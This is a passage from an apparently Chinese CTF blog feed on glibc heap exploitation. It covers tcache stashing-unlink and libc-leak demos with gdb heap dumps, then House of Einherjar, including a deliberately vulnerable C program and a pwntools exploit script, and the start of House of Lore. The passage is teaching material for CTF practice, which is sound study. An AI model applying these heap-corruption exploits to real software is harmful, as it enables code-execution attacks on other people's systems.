class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"As you can see, next malloc(0x90) will return the region our fake chunk: %p\n"</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个 poc 用栈上的一个数组上模拟 <code>fake_chunk</code> 。首先构造出 5 个 <code>tcache chunk</code> 和 2 个 <code>smallbin chunk</code> 的情况。模拟 <code>UAF</code> 漏洞修改 <code>bin2-&gt;bk</code> 为 <code>fake_chunk</code> ，在 <code>calloc(0x90)</code> 的时候触发攻击。</p><p>我们在 <code>calloc</code> 处下断点，调用前查看堆块排布情况。此时 <code>tcache[0xa0]</code> 中有 5 个空闲块。可以看到 chunk1-&gt;bk 已经被改为了 <code>fake_chunk_addr</code> 。而 <code>fake_chunk-&gt;bk</code> 也写上了一个可写地址。由于 <code>smallbin</code> 是按照 <code>bk</code> 指针寻块的，分配得到的顺序应当是 <code>0x0000000000603250-&gt;0x0000000000603390-&gt;0x00007fffffffdbc0 (FIFO)</code> 。调用 calloc 会返回给用户 <code>0x0000000000603250+0x10</code>。</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x6038a0</span> (size : <span class="number">0x20760</span>) </span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>) </span><br><span class="line">            unsortbin: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x0a0</span>)  smallbin[ <span class="number">8</span>]: <span class="number">0x603390</span> (doubly linked list corruption <span class="number">0x603390</span> != <span class="number">0x0</span> <span class="keyword">and</span> <span class="number">0x603390</span> <span class="keyword">is</span> broken)</span><br><span class="line">(<span class="number">0xa0</span>)   tcache_entry[<span class="number">8</span>](<span class="number">5</span>): <span class="number">0x6036c0</span> --&gt; <span class="number">0x603620</span> --&gt; <span class="number">0x603580</span> --&gt; <span class="number">0x6034e0</span> --&gt; <span class="number">0x603440</span></span><br><span class="line">gdb-peda$ x/<span class="number">4</span>gx <span class="number">0x603390</span></span><br><span class="line"><span class="number">0x603390</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x00000000000000a1</span></span><br><span class="line"><span class="number">0x6033a0</span>:       <span class="number">0x0000000000603250</span>      <span class="number">0x00007fffffffdbc0</span></span><br><span class="line">gdb-peda$ x/<span class="number">4</span>gx <span class="number">0x00007fffffffdbc0</span></span><br><span class="line"><span class="number">0x7fffffffdbc0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdbd0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x00007fffffffdbd0</span></span><br><span class="line">gdb-peda$ x/<span class="number">4</span>gx <span class="number">0x0000000000603250</span></span><br><span class="line"><span class="number">0x603250</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x00000000000000a1</span></span><br><span class="line"><span class="number">0x603260</span>:       <span class="number">0x00007ffff7dcfd30</span>      <span class="number">0x0000000000603390</span></span><br><span class="line">gdb-peda$ x/<span class="number">4</span>gx <span class="number">0x00007ffff7dcfd30</span></span><br><span class="line"><span class="number">0x7ffff7dcfd30</span> &lt;main_arena+<span class="number">240</span>&gt;:        <span class="number">0x00007ffff7dcfd20</span>      <span class="number">0x00007ffff7dcfd20</span></span><br><span class="line"><span class="number">0x7ffff7dcfd40</span> &lt;main_arena+<span class="number">256</span>&gt;:        <span class="number">0x0000000000603390</span>      <span class="number">0x0000000000603250</span></span><br></pre></td></tr></table></figure><p>调用 calloc 后再查看堆块排布情况，可以看到 <code>fake_chunk</code> 已经被链入 <code>tcache_entry[8]</code> , 且因为分配顺序变成了 <code>LIFO</code> , <code>0x7fffffffdbd0-0x10</code> 这个块被提到了链表头，下次 <code>malloc(0x90)</code> 即可获得这个块。</p><p>其 fd 指向下一个空闲块，在 unlink 过程中 <code>bck-&gt;fd=bin</code> 的赋值操作使得 <code>0x00007fffffffdbd0+0x10</code> 处写入了一个 libc 地址。</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x6038a0</span> (size : <span class="number">0x20760</span>) </span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>) </span><br><span class="line">            unsortbin: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x0a0</span>)  smallbin[ <span class="number">8</span>]: <span class="number">0x603390</span> (doubly linked list corruption <span class="number">0x603390</span> != <span class="number">0x6033a0</span> <span class="keyword">and</span> <span class="number">0x603390</span> <span class="keyword">is</span> broken)</span><br><span class="line">(<span class="number">0xa0</span>)   tcache_entry[<span class="number">8</span>](<span class="number">7</span>): <span class="number">0x7fffffffdbd0</span> --&gt; <span class="number">0x6033a0</span> --&gt; <span class="number">0x6036c0</span> --&gt; <span class="number">0x603620</span> --&gt; <span class="number">0x603580</span> --&gt; <span class="number">0x6034e0</span> --&gt; <span class="number">0x603440</span></span><br><span class="line">gdb-peda$ x/<span class="number">4</span>gx <span class="number">0x7fffffffdbd0</span></span><br><span class="line"><span class="number">0x7fffffffdbd0</span>: <span class="number">0x00000000006033a0</span>      <span class="number">0x00007fffffffdbd0</span></span><br><span class="line"><span class="number">0x7fffffffdbe0</span>: <span class="number">0x00007ffff7dcfd30</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><h3 id="libc-leak"><a href="#libc-leak" class="headerlink" title="libc leak"></a>libc leak</h3><p>在以前的 libc 版本中，我们只需这样：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> *a = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,a[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是在 2.26 之后的 libc 版本后，我们首先得先把 tcache 填满：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span>* t[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">long</span> *a=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">long</span> *b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// make tcache bin full</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">        t[i]=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">        <span class="built_in">free</span>(t[i]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="comment">// a is put in an unsorted bin because the tcache bin of this size is full</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,a[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后，我们就可以 leak libc 了。如下图：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555559af0</span> (size : <span class="number">0x20510</span>)</span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>)</span><br><span class="line">            unsortbin: <span class="number">0x555555559250</span> (size : <span class="number">0x110</span>)</span><br><span class="line">(<span class="number">0x110</span>)   tcache_entry[<span class="number">15</span>]: <span class="number">0x5555555599f0</span> --&gt; <span class="number">0x5555555598e0</span> --&gt; <span class="number">0x5555555597d0</span> --&gt; <span class="number">0x5555555596c0</span> --&gt; <span class="number">0x5555555595b0</span> --&gt; <span class="number">0x5555555594a0</span> --&gt; <span class="number">0x555555559390</span></span><br><span class="line">gdb-peda$ parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x250</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559250</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x7ffff7fc0ca0</span>    <span class="number">0x7ffff7fc0ca0</span></span><br><span class="line"><span class="number">0x555555559360</span>      <span class="number">0x110</span>               <span class="number">0x20</span>                 Used                None              None</span><br><span class="line"><span class="number">0x555555559380</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559490</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Used                None              None</span><br><span class="line"><span class="number">0x5555555595a0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Used                None              None</span><br><span class="line"><span class="number">0x5555555596b0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Used                None              None</span><br></pre></td></tr></table></figure><h3 id="建议的练习题"><a href="#建议的练习题" class="headerlink" title="建议的练习题"></a>建议的练习题</h3><ul><li>2018 HITCON children_tcache</li><li>2018 BCTF houseOfAtum</li><li>2019 HTICON Lazy House</li><li>2020 XCTF no-Cov twochunk</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;tcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术，目的是提升堆管理的性能。但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式。对 tcache 的深入认识去&lt;a href=&quot;https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/tcache-zh/#tcache&quot;&gt;这里&lt;/a&gt;。这里主要记录一下如何 PWN tcache。
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="二进制" scheme="http://ggb0n.cool/categories/CTF/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
    
      <category term="堆溢出" scheme="http://ggb0n.cool/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-Housese_Of_XXX</title>
    <link href="http://ggb0n.cool/2020/06/07/%E5%A0%86%E6%BA%A2%E5%87%BA-Housese_Of_XXX/"/>
    <id>http://ggb0n.cool/2020/06/07/%E5%A0%86%E6%BA%A2%E5%87%BA-Housese_Of_XXX/</id>
    <published>2020-06-06T16:41:46.000Z</published>
    <updated>2020-06-07T14:52:22.123Z</updated>
    
    <content type="html"><![CDATA[<p>House Of XXX 是 2004 年《The Malloc Maleficarum-Glibc Malloc Exploitation Techniques》中提出的一系列针对 glibc 堆分配器的利用方法。 由于年代久远《The Malloc Maleficarum》中提出的大多数方法今天都不能奏效，我们现在所指的 House Of XXX 利用相比 2004 年文章中写的已有较大的不同。<a id="more"></a></p><p>但是《The Malloc Maleficarum》依然是一篇推荐阅读的文章，可以在这里读到它的原文： <a href="https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt">https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt</a></p><h3 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h3><p>house of einherjar 是一种堆利用技术，由 <code>Hiroki Matsukuma</code> 提出。该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 chunk 。其主要在于滥用 <code>free</code> 中的后向合并操作（合并低地址的 chunk），从而使得尽可能避免碎片化。</p><p>此外，需要注意的是，在一些特殊大小的堆块中，off by one 不仅可以修改下一个堆块的 prev_size，还可以修改下一个堆块的 PREV_INUSE 比特位。</p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><h5 id="后向合并操作"><a href="#后向合并操作" class="headerlink" title="后向合并操作"></a>后向合并操作</h5><p><code>free</code> 函数中的后向合并核心操作如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size(p);</span><br><span class="line">    <span class="built_in">size</span> += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体过程如下：</p><p><img src="http://ggb0n.cool/images/heap4.png" alt=""></p><h5 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h5><p>首先，在之前的堆的介绍中，我们可以知道以下的知识：</p><ul><li>两个物理相邻的 chunk 会共享 <code>prev_size</code>字段，尤其是当低地址的 chunk 处于使用状态时，高地址的 chunk 的该字段便可以被低地址的 chunk 使用。因此，我们有希望可以通过写低地址 chunk 覆盖高地址 chunk 的 <code>prev_size</code> 字段。</li><li>一个 chunk PREV_INUSE 位标记了其物理相邻的低地址 chunk 的使用状态，而且该位是和 prev_size 物理相邻的。</li><li>后向合并时，新的 chunk 的位置取决于 <code>chunk_at_offset(p, -((long) prevsize))</code> 。</li></ul><p>那么如果我们可以同时控制一个 <strong>chunk prev_size</strong> 与 <strong>PREV_INUSE</strong> 字段，那么我们就可以将新的 chunk 指向几乎任何位置。</p><h5 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h5><p><strong>溢出前</strong>：假设溢出前的状态如下图所示：</p><p><img src="http://ggb0n.cool/images/heap5.png" alt=""></p><p><strong>溢出</strong>：这里我们假设<code>p0</code>堆块一方面可以写<code>prev_size</code>字段，另一方面，存在<code>off by one</code>的漏洞，可以写下一个 chunk 的<code>PREV_INUSE</code>部分，那么：</p><p><img src="http://ggb0n.cool/images/heap6.png" alt=""></p><p><strong>溢出后</strong>：假设我们将<code>p1</code>的 <code>prev_size</code> 字段设置为我们想要的目的 chunk 位置与 <code>p1</code> 的差值。在溢出后，我们释放 <code>p1</code>，则我们所得到的新的 chunk 的位置 <code>chunk_at_offset(p1, -((long) prevsize))</code> 就是我们想要的 chunk 位置了。</p><p><img src="http://ggb0n.cool/images/heap7.png" alt=""></p><h4 id="攻击过程示例"><a href="#攻击过程示例" class="headerlink" title="攻击过程示例"></a>攻击过程示例</h4><p>可以进行 House Of Einherjar 攻击的代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* s0 = <span class="built_in">malloc</span>(<span class="number">0x200</span>);　<span class="comment">//构造fake chunk</span></span><br><span class="line">    <span class="keyword">char</span>* s1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">char</span>* s2 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);　</span><br><span class="line">    <span class="keyword">char</span>* s3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>); <span class="comment">//为了不让s2与top chunk 合并</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"begin\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, s0);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"input s0\n"</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, s0, <span class="number">0x200</span>); <span class="comment">//读入fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"input s1\n"</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, s1, <span class="number">0x19</span>); <span class="comment">//Off By One</span></span><br><span class="line">    <span class="built_in">free</span>(s2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./example"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">"begin\n"</span>)</span><br><span class="line">address = int(p.recvline().strip(), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">"input s0\n"</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(address) * <span class="number">2</span> + <span class="string">"A"</span>*<span class="number">0xe0</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">p64(address) * 2是为了绕过</span></span><br><span class="line"><span class="string">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \</span></span><br><span class="line"><span class="string">  malloc_printerr ("corrupted double-linked list");</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">payload += p64(<span class="number">0x100</span>) <span class="comment">#fake size</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">"input s1\n"</span>)</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x10</span> + p64(<span class="number">0x220</span>) + <span class="string">"\x00"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvall()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><p>利用 unlink 漏洞的时候：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">p-&gt;fd = &amp;p<span class="number">-3</span>*<span class="number">4</span></span><br><span class="line">p-&gt;bk = &amp;p<span class="number">-2</span>*<span class="number">4</span></span><br></pre></td></tr></table></figure><p>在这里利用时，因为没有办法找到 <code>&amp;p</code> , 所以直接让：</p><figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">p</span>-&gt;</span>fd = p</span><br><span class="line"><span class="function"><span class="title">p</span>-&gt;</span>bk = p</span><br></pre></td></tr></table></figure><p>这里需要注意一个点：</p><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0</span>x101) + p64(<span class="name">address</span>) * <span class="number">2</span> + <span class="string">"A"</span>*0xe0</span><br></pre></td></tr></table></figure><p>其实修改为下面这样也是可以的:</p><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0</span>x221) + p64(<span class="name">address</span>) * <span class="number">2</span> + <span class="string">"A"</span>*0xe0</span><br></pre></td></tr></table></figure><p>按照道理来讲 fake chunk 的 size 是 <code>0x221</code> 才合理，但是为什么 <code>0x101</code> 也可以呢？这是因为对 size 和 prev_size 的验证只发生在 unlink 里面，而 unlink 里面是这样验证的:</p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      <span class="selector-tag">malloc_printerr</span> (<span class="string">"corrupted size vs. prev_size"</span>);</span><br></pre></td></tr></table></figure><p>所以只需要再伪造 fake chunk 的 next chunk 的 prev_size 字段就好了。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>这里我们总结下这个利用技术需要注意的地方：</p><ul><li>需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分</li><li>我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址</li><li>我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测</li></ul><p>其实，该技术与 chunk extend/shrink 技术比较类似。</p><h3 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h3><p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。</p><p>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。</p><p>House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>如果在 malloc 的时候，申请的内存块在 small bin 范围内，那么执行的流程如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If a small request, check regular bin.  Since these "smallbins"</span></span><br><span class="line"><span class="comment">   hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">   (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">   processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">   anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">    <span class="comment">// 获取 small bin 的索引</span></span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    <span class="comment">// 获取对应 small bin 中的 chunk 指针</span></span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line">    <span class="comment">// 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">    <span class="comment">// 如果 victim = bin ，那说明该 bin 为空。</span></span><br><span class="line">    <span class="comment">// 如果不相等，那么会有两种情况</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">        <span class="comment">// 第一种情况，small bin 还没有初始化。</span></span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            <span class="comment">// 执行初始化，将 fast bins 中的 chunk 进行合并</span></span><br><span class="line">            malloc_consolidate(av);</span><br><span class="line">        <span class="comment">// 第二种情况，small bin 中存在空闲的 chunk</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">            set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">            <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line">            <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">            <span class="comment">// 细致的检查</span></span><br><span class="line">            check_malloced_chunk(av, victim, nb);</span><br><span class="line">            <span class="comment">// 将申请到的 chunk 转化为对应的 mem 状态</span></span><br><span class="line">            <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">            <span class="comment">// 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">            alloc_perturb(p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从中可以看出，如果我们可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的 fake chunk，并且同时满足之后的 bck-&gt;fd != victim 的检测，那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake chunk。也就是说，当下一次申请 small bin 的时候，我们就会分配到指定位置的 fake chunk。</p><h4 id="攻击过程代码"><a href="#攻击过程代码" class="headerlink" title="攻击过程代码"></a>攻击过程代码</h4><p>示例代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span 